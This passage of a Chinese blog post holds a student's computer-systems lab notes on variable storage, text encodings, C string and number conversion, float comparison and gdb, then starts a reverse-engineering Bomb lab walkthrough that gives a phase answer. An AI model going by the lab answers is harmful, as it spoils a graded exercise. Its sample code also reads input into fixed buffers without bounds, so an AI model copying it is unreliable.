href="https://blog.csdn.net/handsome_bear/article/details/102970573">const、static变量存储位置</a></p><p>①static无论是全局变量还是局部变量都存储在全局/静态区域，在编译期就为其分配内存，在程序结束时释放。</p><p>②<strong>const全局变量</strong>存储在只读数据段，编译期最初将其保存在符号表中，第一次使用时为其分配内存，在程序结束时释放；<strong>const局部变量</strong>存储在栈中，代码块结束时释放。</p><p>③全局变量存储在全局/静态区域，在编译期为其分配内存，在程序结束时释放。</p><p>④局部变量存储在栈中，代码块结束时释放。</p><p>注：当全局变量和静态局部变量未赋初值时，系统自动置为0。但未初始化全局变量为弱类型，可能会改变为引用其他可重定位模块内的同名变量。</p><p>例、</p><p>x ：全局  .data</p><p>y ：局部  stack</p><p>z ：局部char*  .text</p><p><img src="/2021/computer-architecture-hitlabs/6.png"></p><p><img src="/2021/computer-architecture-hitlabs/8.png" alt="各段地址区域"></p><p>x 与 z 都是通过与当前指令指针偏移量来定位其在内存中的位置，而存在stack中的y是通过 基址寄存器 rbp 来定位。</p><p><img src="/2021/computer-architecture-hitlabs/7.png" alt="汇编代码看数据访问方式"></p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><ol><li>源程序的编码：和OS、编辑器、编译器相关，Linux / windows/Mac 下的编码与回车处理不同，所以不同编码在不正确的使用环境下可能有编译以及错误输出。<br>分析验证：VS/CB/GCC下不同源程序编码是怎么处理的？</li></ol><ol start="2"><li><strong>深入研究Unicode标准和UTF-8编码</strong></li></ol><ul><li><p><a href="https://www.bilibili.com/video/BV1gZ4y1x7p7">非常详细的字符编码讲解，ASCII、GB2312、GBK、Unicode、UTF-8等知识点都有</a></p></li><li><p>GB2312为什么要加上0xA0：GB2312 是双字节编码，为了与 ASCII 码区分开，字节的第8位必须是1，所以至少要从 0x80(128, 1000 0000) 开始吧，但是根据上面的规定，0x80 - 0x9f 要留给控制块，所以只能从 0xA0 开始咯。那为什么 GB2312 编码不是从 0xA0 开始，而是 0xA1 开始呢？ 因为 0xA0 正好是图形块的空格，所以就从 0xA1 开始编码。</p></li><li><p><a href="https://www.youtube.com/watch?v=I-pQH_krD0M&ab_channel=ComputerScience">ASCII and Unicode Character Sets</a></p></li><li><p><a href="http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html">字符编码笔记：ASCII，Unicode 和 UTF-8 - 阮一峰</a></p></li><li><p><a href="http://cenalulu.github.io/linux/character-encoding/">十分钟搞清字符集和字符编码</a></p></li><li><p><a href="https://www.zhihu.com/question/52346583">长文答案-知乎unicode与utf-8</a></p></li><li><p><a href="https://www.cnblogs.com/54chensongxia/p/11650841.html">编码问题：基础概念与延伸</a></p></li><li><p><a href="https://www.zhihu.com/question/20650946">Windows 记事本的 ANSI、Unicode、UTF-8 这三种编码模式有什么区别？</a> (混乱程度可见一斑)</p></li><li><p><a href="https://www.cnblogs.com/malecrab/p/5300486.html">ANSI是什么编码？</a></p></li><li><p><a href="https://www.codenong.com/cs105965196/">名词解释：Unicode、UCS-2/4、UTF-8/16/32、GB2312、GBK</a></p></li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Unicode符号范围         |        UTF<span class="number">-8</span>编码方式</span><br><span class="line">   (十六进制)           |         （二进制）</span><br><span class="line">-----------------------+---------------------------------------------</span><br><span class="line"><span class="number">0000</span> <span class="number">0000</span><span class="number">-0000</span> <span class="number">007</span>F    |        <span class="number">0</span>xxxxxxx</span><br><span class="line"><span class="number">0000</span> <span class="number">0080</span><span class="number">-0000</span> <span class="number">07</span>FF    |        <span class="number">110</span>xxxxx <span class="number">10</span>xxxxxx</span><br><span class="line"><span class="number">0000</span> <span class="number">0800</span><span class="number">-0000</span> FFFF    |        <span class="number">1110</span>xxxx <span class="number">10</span>xxxxxx <span class="number">10</span>xxxxxx</span><br><span class="line"><span class="number">0001</span> <span class="number">0000</span><span class="number">-0010</span> FFFF    |        <span class="number">11110</span>xxx <span class="number">10</span>xxxxxx <span class="number">10</span>xxxxxx <span class="number">10</span>xxxxxx</span><br></pre></td></tr></table></figure><p>UTF16编码是Unicode最直接的实现方式，通常我们在windows上新建文本文件后保存为Unicode编码，其实就是保存为UTF16编码。</p><ol start="3"><li><strong>C语言处理utf-8文本</strong></li></ol><ul><li><a href="https://segmentfault.com/a/1190000004274760">在 C 程序中处理 UTF-8 文本</a></li></ul><p>打印数据的字节（十六进制）表示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 先取数据地址，转换成单字节长度的类型（unsigned char）的指针，</span></span><br><span class="line"><span class="comment">// 然后按照十六进制逐字节打印即可，格式为“%.2x”。</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)(str + i));</span><br></pre></td></tr></table></figure><p>utf8len：计算utf8编码的字符串的个数。</p><p>！错误：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210416204335280.png" alt="image-20210416204335280"></p><ul><li><p>比较时应该为二进制，而写成了0x十六进制，C没有二进制的直接表示，将之转化为十六进制写入。</p></li><li><p>byte &amp; 1000 0000 == 0 却不进入分支?<br>优先级问题。</p></li></ul><p><img src="/2021/computer-architecture-hitlabs/image-20210416210130066.png" alt="image-20210416210130066"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">utf8len</span><span class="params">(<span class="keyword">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//      unsigned char c1 = 1 &lt;&lt; 7;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> c2 = <span class="number">1</span> &lt;&lt; <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> c3 = <span class="number">7</span> &lt;&lt; <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> c4 = <span class="number">15</span> &lt;&lt; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str); i++) &#123;</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">char</span> byte = *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)(str + i);</span><br><span class="line">                <span class="keyword">if</span>(byte &lt;= <span class="number">0x7F</span>) &#123;</span><br><span class="line">                        <span class="comment">// 0xxx xxxx</span></span><br><span class="line">                        num++;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((byte &amp; c2) == <span class="number">0x40</span>) &#123;</span><br><span class="line">                        <span class="comment">// 110x xxxx  xxxx xxxx</span></span><br><span class="line">                        num++;</span><br><span class="line">                        i++;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((byte &amp; c3) == <span class="number">0x60</span>) &#123;</span><br><span class="line">                        <span class="comment">// 1110 xxxx  xxxx xxxx  xxxx xxxx</span></span><br><span class="line">                        num++;</span><br><span class="line">                        i += <span class="number">2</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((byte &amp; c4) == <span class="number">0x70</span>) &#123;</span><br><span class="line">                        <span class="comment">// 1111 0xxx  xxxx xxxx  xxxx xxxx  xxxx xxxx</span></span><br><span class="line">                        num++;</span><br><span class="line">                        i += <span class="number">3</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *str = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">100</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str); i++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)(str + i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> len = utf8len(str);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The number of characters is %d\n&quot;</span>, len);</span><br><span class="line">        <span class="built_in">free</span>(str);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/computer-architecture-hitlabs/image-20210416210258729.png" alt="image-20210416210258729"></p><ol start="4"><li><strong>字符串比较函数 strcmp() 对中文的处理</strong></li></ol><p><img src="/2021/computer-architecture-hitlabs/image-20210417075647150.png" alt="image-20210417075647150"></p><p>strcmp() 源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">strcmp</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * src, <span class="keyword">const</span> <span class="keyword">char</span> * dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span> ;</span><br><span class="line">    <span class="keyword">while</span>( ! (ret = *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)src - *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)dst) &amp;&amp; *dst)</span><br><span class="line">                ++src, ++dst;  </span><br><span class="line">    <span class="keyword">if</span> ( ret &lt; <span class="number">0</span> )</span><br><span class="line">           ret = <span class="number">-1</span> ;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( ret &gt; <span class="number">0</span> )</span><br><span class="line">           ret = <span class="number">1</span> ;</span><br><span class="line">    <span class="keyword">return</span>( ret );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>中文比较实际上也是比较字符在计算机中存储的01，而字符的01是由字符集与字符编码共同决定的，编码字符集Unicode，有UTF-8、UTF-16、UTF-32等多种字符编码；编码字符集ASCII，本身就是编码字符集，又是字符编码；编码字符集CB2312，只有EUC-CN一种字符编码，以下以utf-8为例。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210417080821157.png" alt="unicode中文范围"></p><p>在linux中，默认使用的编码方式是不带BOM的UTF-8，则汉字的存储顺序是基本按照汉字字符在Unicode中的码点值(code point)来决定的。</p><ul><li><a href="https://www.cnblogs.com/huahuahu/p/Unicode-zi-fu-chuan-pai-xu-gui-ze-yi-ru-he-que-din.html">Unicode 字符串排序规则（一）：如何确定单个字符的顺序</a></li><li><a href="https://www.cnblogs.com/huahuahu/p/Unicode-zi-fu-chuan-pai-xu-gui-ze-er-ru-he-bi-jiao.html">Unicode 字符串排序规则（二）：如何比较字符串</a></li><li><a href="https://www.unicode.org/charts/rs.pdf">官方文档 简</a>      <a href="http://www.unicode.org/versions/Unicode13.0.0/ch18.pdf">官方文档 详</a></li><li><a href="https://www.unicode.org/reports/tr38/">UNICODE HAN DATABASE (UNIHAN)</a></li><li><a href="https://zhuanlan.zhihu.com/p/50380852">深入理解苹果系统（Unicode）字符串的排序方法</a></li></ul><p>Unicode Collation Algorithm (UCA) 是 Unicode 制定的如何比较两个 Unicode 字符串的规范。UCA指定了默认情况下 Unicode 字符的顺序。但是这仅仅是默认情况，也就是照顾了大多数情况（也就是排序对英语国家比较友好）。对于其他地区的人们来说，就需要输入和默认情况不同的数据，以获得和当地习惯相符合的结果。比如同样的汉字，在中国大陆是按照汉语拼音排序的，在香港就是按照笔画数目排序的，笔画排序的依据主要是康熙字典第七版。</p><p>Common Locale Data Repository (CLDR)，从名字上可以看出，这个实际上是一堆数据的仓库。对于指定的地区 (locale)，可以从中找到指定的数据。再结合 UCA，就可以得到符合当期习惯的排序结果。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210417101024600.png"></p><p>中国大陆使用unicode实际上是首先按照拼音排序，表现为不同行之间的顺序。对于同音字，也就是每一行之间的顺序，先按照笔画数排序，再按照<code>kRSUnicode</code>排序。</p><h2 id="数据变换与输入输出"><a href="#数据变换与输入输出" class="headerlink" title="数据变换与输入输出"></a>数据变换与输入输出</h2><ol><li><strong>printf 与 scanf 的实现</strong></li></ol><p><a href="https://blog.csdn.net/u010125463/article/details/46522587">浅析Scanf源码</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><a href="https://blog.csdn.net/rakish_wind/article/details/81433679">gets（）函数与scanf（）函数对读取字符串的区别之处</a></li></ol><p>gets()：可接受带空格的字符串，回车终止，在字符串末尾补’\0’，会从输入缓存区中吸收回车，可接受空字符串。</p><p>（PS：puts（）输出字符串时会自动加上换行。）</p><p>scanf()：%s吸收字符串时，不吸收空白符，遇见空白符停止吸收，在字符串末尾补’\0’，并且scanf（）吸收字符时会自动略过开头的空白符，直至遇见一个非空白符才开始它的吸收过程。</p><ul><li><a href="https://www.cnblogs.com/52php/p/5724372.html">C中各input函数用法</a></li></ul><ol start="3"><li><strong>编写函数cs_atoi/cs_atof  （字符串转正数/浮点数）</strong><br>字符串限定为十进制，处理效果同scanf</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str); i++) &#123;</span><br><span class="line">                res = res * <span class="number">10</span> + (str[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;int: %d\n&quot;</span>, res);</span><br><span class="line">        assert(res == atoi(str));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;float.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">        <span class="keyword">double</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len &amp;&amp; str[i] != <span class="string">&#x27;.&#x27;</span>; i++) &#123;</span><br><span class="line">                res = res * <span class="number">10</span> + (str[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">double</span> t = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = i+<span class="number">1</span>; i &lt; len; i++,t*=<span class="number">10</span>) &#123;</span><br><span class="line">                res += (str[i] - <span class="string">&#x27;0&#x27;</span>) / t;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;double: %lf\n&quot;</span>, res);</span><br><span class="line">        <span class="keyword">double</span> atod = atof(str);</span><br><span class="line">        assert(<span class="built_in">fabs</span>(res - atod) &lt;= <span class="number">1e-5</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li><strong>编写函数cs_itoa/cs_ftoa  （正数/浮点数转字符串）</strong><br>字符串限定为十进制，处理效果同printf</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *  <span class="title">itoa</span> <span class="params">( <span class="keyword">int</span> value, <span class="keyword">char</span> * str, <span class="keyword">int</span> base )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">char</span> c[<span class="number">100</span>];</span><br><span class="line">        c[<span class="number">99</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">98</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">        <span class="keyword">while</span>(i != <span class="number">0</span>) &#123;</span><br><span class="line">                c[num--] = i % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                i /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, &amp;c[num+<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;float.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">itoa</span><span class="params">(<span class="keyword">int</span> value, <span class="keyword">char</span> * str, <span class="keyword">int</span> base)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">double</span> d;</span><br><span class="line">        <span class="keyword">char</span> c[<span class="number">100</span>];</span><br><span class="line">        c[<span class="number">99</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">98</span>;</span><br><span class="line">        <span class="keyword">int</span> time = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>, &amp;d);</span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">fabs</span>((<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">long</span>)(d*<span class="number">10</span>)/<span class="number">10</span>) - d) &gt; DBL_EPSILON) &#123;</span><br><span class="line">                <span class="comment">// still have .</span></span><br><span class="line">                d *= <span class="number">10</span>;</span><br><span class="line">                time++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> l = (<span class="keyword">long</span> <span class="keyword">long</span>) d;</span><br><span class="line">        <span class="keyword">while</span>(l != <span class="number">0</span>) &#123;</span><br><span class="line">                c[num--] = l % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                time--;</span><br><span class="line">                <span class="keyword">if</span>(time == <span class="number">0</span>) &#123;</span><br><span class="line">                        c[num--] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                        time--;</span><br><span class="line">                &#125;</span><br><span class="line">                l /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, &amp;c[num+<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li><strong>浮点数比较</strong></li></ol><p><a href="https://bot-man-jl.github.io/articles/?post=2020/Comparing-Floating-Point-Numbers">如何比较两个浮点数</a></p><p>对于浮点数：<strong>除了能用2的指数幂乘以整数表示的浮点数能够被精确的表示外，其余的浮点数都是近似表示的。</strong></p><p>使用fabs来求绝对值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">fabs</span>(f1 - f2) &lt;= <span class="number">1e-6</span>) &#123;  <span class="comment">//equal</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 或者使用 float.h 中的 FLT_ESPILON(1.1920929e-7) | DBL_EPSILON(2.22045e-16)</span></span><br></pre></td></tr></table></figure><p>错误：</p><p><img src="/2021/computer-architecture-hitlabs/10.png"></p><p>1）abs() 函数传入浮点数时：abs会把该浮点数解释为int，因此数字可能会变得很大。</p><p>2）fabs() 结果错误：没有包含头文件 stdlib.h，运行没有报错，返回0。</p><p>单精度数7位有效数字。 （float）<br>双精度数16位有效数字。（double）</p><p>单精度数的尾数用23位存储，加上默认的小数点前的1位1，2^(23+1) = 16777216。因为 10^7 &lt; 16777216 &lt; 10^8，所以说单精度浮点数的有效位数是7位。 双精度的尾数用52位存储，2^(52+1) = 9007199254740992，10^16 &lt; 9007199254740992 &lt; 10^17，所以双精度的有效位数是16位</p><p>单精度浮点数的实际有效精度为24位二进制，这相当于 24*log102≈7.2 位10进制的精度，所以平时我们说“单精度浮点数具有7位精度”。（精度的理解：当从1.000…02变化为1.000…12时，变动范围为 2-23，考虑到因为四舍五入而得到的1倍精度提高，所以单精度浮点数可以反映2-24的数值变化，即24位二进制精度）</p><p><a href="https://blog.csdn.net/github_33873969/article/details/78040129">C语言的int, float,double相互转化（从本质上理解可能的问题）</a></p><p><img src="https://img-blog.csdn.net/20170920213214857?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzMzODczOTY5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"></p><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><ol><li>codeblocks 调试时不停下。</li></ol><p>原因一、project中文路径。</p><p>原因二、codeblocks 版本与 gcc gdb 不兼容。</p><ol start="2"><li><p>gdb调试时查看全局变量内存，使用命令： x /x x</p><p>Cannot access memory at address 0xffffffffb90efc69.</p></li></ol><p>原因：x命令后接地址，直接写x代表你要访问(x)的内容，自然报错。正确：x /x &amp;x</p><h2 id="收获-1"><a href="#收获-1" class="headerlink" title="收获"></a>收获</h2><ol><li>学会了如何用gdb, objdump来调试程序、观察程序信息。</li><li>练习了寻找和整理有效信息的能力。</li><li>对浮点数的二进制表示有了更深的理解。</li><li>对unicode字符集、utf编码、ANSI、ASCII、GBK编码有了较为全面的了解。</li><li>了解了不同变量在内存中的存储位置和内存的段分布。</li></ol><h1 id="实验三-Bomb"><a href="#实验三-Bomb" class="headerlink" title="实验三 Bomb"></a>实验三 Bomb</h1><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase 1"></a>phase 1</h2><p>b 74</p><p>进入phase_1:</p><p><img src="/2021/computer-architecture-hitlabs/image-20210421174611067.png"></p><p>推测拆弹密码字符串的存储地址为<code>$0x403150</code>，因为调用<code>strings_not_equal</code>前有把该地址放入esi寄存器的语句。</p><p>以字符串形式查看该地址内容，得到：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210421175019595.png"></p><h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase 2"></a>phase 2</h2><p>b 82</p><p>I am just a renegade hockey mom.</p><p>进入phase_2:</p><p><img 